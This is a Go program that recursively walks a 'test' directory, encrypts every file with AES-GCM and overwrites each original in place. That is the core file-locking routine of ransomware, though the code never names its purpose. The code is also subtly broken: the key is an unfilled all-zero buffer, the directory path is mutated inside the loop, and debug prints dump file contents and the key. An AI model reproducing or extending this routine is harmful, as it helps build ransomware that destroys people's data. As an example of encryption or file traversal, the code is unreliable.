package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
)

var allFiles []string

func main() {

	home, _ := os.UserHomeDir()
	fmt.Println("home ", home)

	testdir := ".\\test"

	files, err := os.ReadDir(testdir)
	if err != nil {
		fmt.Println("ERROR: ", err)
		os.Exit(1)
	}

	traverseFiles(files, testdir)
}

func dirRecurse(dirname os.DirEntry, base string) {
	files, err := os.ReadDir(base)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	traverseFiles(files, base)
}

func traverseFiles(files []os.DirEntry, base string) {
	for _, file := range files {
		if file.IsDir() {
			fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
			base = base + "\\" + file.Name()
			dirRecurse(file, base)
		} else {
			fmt.Println("traverseFiles read file path: ", base+"\\"+file.Name())
			path := base + "\\" + file.Name()
			data, err := os.ReadFile(path)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			encryptFile(data, path)
			fmt.Println("file data: ", data)
		}
	}
}

func encryptFile(file []byte, path string) {
	fmt.Println("file contents ", string(file))
	fmt.Println("path ", path)

	key := make([]byte, 32)
	fmt.Println("key ", key)

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	nonce := make([]byte, gcm.NonceSize())

	// populate nonce with cryptographically secure random seq
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	data := gcm.Seal(nonce, nonce, file, nil)
	fmt.Println("enc data ", data)
	os.WriteFile(path, data, 0777)
}
